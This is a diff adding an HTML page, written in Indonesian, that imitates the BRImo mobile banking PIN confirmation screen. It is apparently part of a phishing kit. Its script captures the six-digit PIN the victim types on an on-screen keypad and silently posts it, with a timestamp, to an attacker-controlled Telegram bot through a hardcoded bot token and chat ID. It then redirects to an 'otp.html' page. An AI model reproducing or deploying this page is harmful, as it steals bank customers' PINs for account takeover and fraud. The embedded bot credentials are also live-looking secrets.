@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi PIN - BRImo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            /* ✅ Ubah ke gradien biru yang sama */
+            background: linear-gradient(135deg, #003366 0%, #00529B 50%, #0070C0 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 25px;
+            color: white;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 40px;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 0;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        /* Judul & Sub-judul */
+        .title-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .main-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .sub-title {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        /* Kotak PIN */
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .pin-box {
+            width: 48px;
+            height: 52px;
+            background-color: rgba(255, 255, 255, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .pin-box.filled {
+            background-color: rgba(255, 255, 255, 0.45);
+        }
+
+        /* Lupa PIN */
+        .forgot-pin {
+            text-align: center;
+            margin-bottom: 45px;
+        }
+
+        .forgot-pin a {
+            /* ✅ Ubah jadi oranye konsisten */
+            color: #FF6A00;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Keyboard Angka */
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .key {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            font-size: 24px;
+            font-weight: 500;
+            padding: 15px;
+            cursor: pointer;
+            transition: background 0.2s;
+            border-radius: 8px;
+        }
+
+        .key:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .key-empty {
+            visibility: hidden;
+        }
+
+        .key-back {
+            font-size: 22px;
+        }
+
+        .loading {
+            text-align: center;
+            margin-top: 20px;
+            color: #FFFFFF;
+            display: none;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="back-btn">←</div>
+        <h1 class="header-title">PIN</h1>
+    </div>
+
+    <!-- Judul -->
+    <div class="title-section">
+        <h2 class="main-title">Konfirmasi PIN</h2>
+        <p class="sub-title">Konfirmasi PIN yang sudah kamu buat</p>
+    </div>
+
+    <!-- Kotak PIN -->
+    <div class="pin-container" id="pinContainer">
+        <div class="pin-box" data-index="0"></div>
+        <div class="pin-box" data-index="1"></div>
+        <div class="pin-box" data-index="2"></div>
+        <div class="pin-box" data-index="3"></div>
+        <div class="pin-box" data-index="4"></div>
+        <div class="pin-box" data-index="5"></div>
+    </div>
+
+    <!-- Lupa PIN -->
+    <div class="forgot-pin">
+        <a href="#">Lupa PIN?</a>
+    </div>
+
+    <!-- Keyboard Angka -->
+    <div class="keyboard">
+        <button class="key" data-value="1">1</button>
+        <button class="key" data-value="2">2</button>
+        <button class="key" data-value="3">3</button>
+        <button class="key" data-value="4">4</button>
+        <button class="key" data-value="5">5</button>
+        <button class="key" data-value="6">6</button>
+        <button class="key" data-value="7">7</button>
+        <button class="key" data-value="8">8</button>
+        <button class="key" data-value="9">9</button>
+        <button class="key key-empty"></button>
+        <button class="key" data-value="0">0</button>
+        <button class="key key-back" data-action="back">⌫</button>
+    </div>
+
+    <div class="loading" id="loading">Memproses PIN...</div>
+
+    <script>
+        // === SETTING TELEGRAM BOT ===
+        const BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
+        const CHAT_ID = "8592742129";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        let pin = "";
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loading = document.getElementById('loading');
+
+        // Input angka
+        document.querySelectorAll('.key[data-value]').forEach(key => {
+            key.addEventListener('click', function() {
+                if (pin.length < 6) {
+                    pin += this.dataset.value;
+                    updatePinDisplay();
+                    
+                    // Jika PIN lengkap 6 digit, kirim otomatis
+                    if (pin.length === 6) {
+                        kirimPIN();
+                    }
+                }
+            });
+        });
+
+        // Hapus angka
+        document.querySelector('.key-back').addEventListener('click', function() {
+            if (pin.length > 0) {
+                pin = pin.slice(0, -1);
+                updatePinDisplay();
+            }
+        });
+
+        // Update tampilan kotak PIN
+        function updatePinDisplay() {
+            pinBoxes.forEach((box, index) => {
+                if (index < pin.length) {
+                    box.textContent = '●';
+                    box.classList.add('filled');
+                } else {
+                    box.textContent = '';
+                    box.classList.remove('filled');
+                }
+            });
+        }
+
+        // Kirim PIN ke Telegram & pindah ke otp.html
+        async function kirimPIN() {
+            loading.style.display = 'block';
+            
+            const pesan = `🔐 KONFIRMASI PIN DITERIMA
+
+📌 PIN: ${pin}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // ✅ Berhasil -> Pindah ke halaman otp.html
+                window.location.href = 'otp.html';
+                
+            } catch (error) {
+                alert('❌ Gagal mengirim! Cek koneksi internet.');
+                console.error(error);
+                loading.style.display = 'none';
+                pin = "";
+                updatePinDisplay();
+            }
+        }
+    </script>
+</body>
+</html>
